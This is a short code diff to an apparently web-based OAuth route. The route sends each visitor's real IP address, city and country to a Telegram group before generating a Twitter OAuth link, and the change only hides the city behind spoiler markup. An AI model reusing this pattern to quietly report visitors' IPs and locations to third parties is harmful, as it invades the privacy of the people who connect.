@@ -53,7 +53,7 @@ def oauth():
     country, city = location_data.get("country"), location_data.get("city")
     country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
 
-    message = f'🌐 *Connection:* {real_ip}\n\n{country_flag} *{city}, {country}*'
+    message = f'🌐 *Connection:* {real_ip}\n\n{country_flag} *||{city}||, {country}*'
     send_telegram_message(group['group_id'], message)
 
     twitter_oauth_url = generate_twitter_oauth_url()
